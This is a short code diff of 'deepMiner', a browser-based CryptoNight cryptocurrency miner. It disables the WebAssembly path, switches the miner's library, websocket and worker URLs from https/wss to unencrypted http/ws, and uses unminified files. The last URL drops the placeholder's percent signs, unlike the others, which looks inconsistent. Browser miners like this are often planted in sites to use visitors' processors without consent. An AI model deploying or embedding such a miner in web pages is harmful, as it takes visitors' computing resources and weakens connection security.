@@ -172,7 +172,8 @@
         }
     };
     Miner.prototype.hasWASMSupport = function () {
-        return window.WebAssembly !== undefined
+        //return window.WebAssembly !== undefined
+        return false;
     };
     Miner.prototype.isRunning = function () {
         return this._threads.length > 0
@@ -574,9 +575,9 @@
 })(window);
 self.deepMiner = self.deepMiner || {};
 self.deepMiner.CONFIG = {
-    LIB_URL: "https://%deepMiner_domain%/lib/",
-    WEBSOCKET_SHARDS: [["wss://%deepMiner_domain%/api"]],
-    ASMJS_NAME: "cryptonight-asmjs.min.js",
+    LIB_URL: "http://%deepMiner_domain%/lib/",
+    WEBSOCKET_SHARDS: [["ws://%deepMiner_domain%/api"]],
+    ASMJS_NAME: "cryptonight-asmjs.js",
     REQUIRES_AUTH: false
 };
-deepMiner.CRYPTONIGHT_WORKER_BLOB = "https://%deepMiner_domain%/worker.min.js";
+deepMiner.CRYPTONIGHT_WORKER_BLOB = "http://deepMiner_domain/worker.js";
